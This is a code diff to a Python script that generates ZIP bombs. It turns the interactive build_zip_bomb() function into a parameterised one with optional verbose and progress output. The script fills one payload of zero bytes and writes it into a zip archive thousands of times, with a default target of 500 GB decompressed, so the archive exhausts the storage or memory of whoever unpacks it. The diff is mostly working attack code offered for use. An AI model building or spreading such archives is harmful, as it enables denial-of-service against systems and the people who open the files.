@@ -29,21 +29,30 @@ def get_bytes(amount_str):
     except:
         raise ValueError("Format: <number> <unit>, e.g., 1 PB or 500 GB")
 
-def build_zip_bomb():
-    target_input = input("Bomb decompressed size: ") or "500 GB"
-    payload_input = input("Payload file size: ") or "1 MB"
-    zip_name = input("Output zip name: ") or "bomb.zip"
-    folder_name = input("Bomb directory name: ") or "bomb-dir"
+def build_zip_bomb(
+    target_input=None,
+    payload_input=None,
+    zip_name=None,
+    folder_name=None,
+    verbose=True,
+    show_progress=True
+):
+    target_input = target_input or input("Bomb decompressed size: ") or "500 GB"
+    payload_input = payload_input or input("Payload file size: ") or "1 MB"
+    zip_name = zip_name or input("Output zip name: ") or "bomb.zip"
+    folder_name = folder_name or input("Bomb directory name: ") or "bomb-dir"
 
     PAYLOAD_NAME = "payload.txt"
     DECOMPRESSED_TOTAL = get_bytes(target_input)
     PAYLOAD_SIZE = get_bytes(payload_input)
     REPEATS = DECOMPRESSED_TOTAL // PAYLOAD_SIZE
-    print(f"\n  Creating ZIP bomb:\n")
-    print(f"    Payload size:         {PAYLOAD_SIZE} bytes")
-    print(f"    Total uncompressed:   {DECOMPRESSED_TOTAL} bytes")
-    print(f"    File count:           {REPEATS}")
-    print(f"    Output:               {zip_name}\n")
+
+    if verbose:
+        print(f"\n  Creating ZIP bomb:\n")
+        print(f"    Payload size:         {PAYLOAD_SIZE} bytes")
+        print(f"    Total uncompressed:   {DECOMPRESSED_TOTAL} bytes")
+        print(f"    File count:           {REPEATS}")
+        print(f"    Output:               {zip_name}\n")
 
     with open(PAYLOAD_NAME, "wb") as f:
         f.write(b'\0' * PAYLOAD_SIZE)
@@ -52,10 +61,13 @@ def build_zip_bomb():
         for i in range(REPEATS):
             arcname = f"{folder_name}/{i}.txt"
             zf.write(PAYLOAD_NAME, arcname)
-            progress_bar(i + 1, REPEATS)
+            if show_progress:
+                progress_bar(i + 1, REPEATS)
 
     os.remove(PAYLOAD_NAME)
-    print(f"\n\nCreated zip bomb: {zip_name}")
+
+    if verbose:
+        print(f"\n\nCreated zip bomb: {zip_name}")
 
 if __name__ == "__main__":
     main()
